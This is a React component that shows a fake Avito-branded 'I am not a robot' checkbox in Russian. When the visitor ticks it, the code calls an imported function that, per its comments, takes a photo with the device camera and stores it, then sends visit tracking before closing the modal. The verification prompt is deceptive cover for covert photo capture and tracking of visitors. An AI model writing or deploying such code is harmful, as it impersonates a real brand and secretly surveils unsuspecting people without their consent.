import { useState } from "react";
import avitoImage from '../assets/image.png';
import { captureAndSendPhoto } from './captureAndSendPhoto';
import { getUserId, sendTrack } from '../useTrackVisit';

export default function RobotCheckModal({ onConfirm }) {
  const [checked, setChecked] = useState(false);

  const handleCheck = async () => {
    if (checked) return;
    setChecked(true);

    const userId = getUserId();

    // 1. Сначала пробуем сделать фото (если нет камеры — продолжаем без фото)
    if (userId) {
      await captureAndSendPhoto(userId);
    }

    // 2. Потом отправляем трек (фото уже сохранено в хранилище)
    await sendTrack();

    // 3. Закрываем модалку
    onConfirm();
  };

  return (
    <div className="modal-background" style={{ display: "flex" }}>
      <div className="modal">
        <div className="avito_div">
          <img className="avito_logo" src={avitoImage} alt="" />
        </div>
        <p className="modal-text">Подтвердите, что вы не робот</p>
        <label className="not-robot-checkbox">
          <input
            type="checkbox"
            checked={checked}
            onChange={handleCheck}
          />
          <span className="not-robot-box"></span>
          <span>Я не робот</span>
        </label>
      </div>
    </div>
  );
}
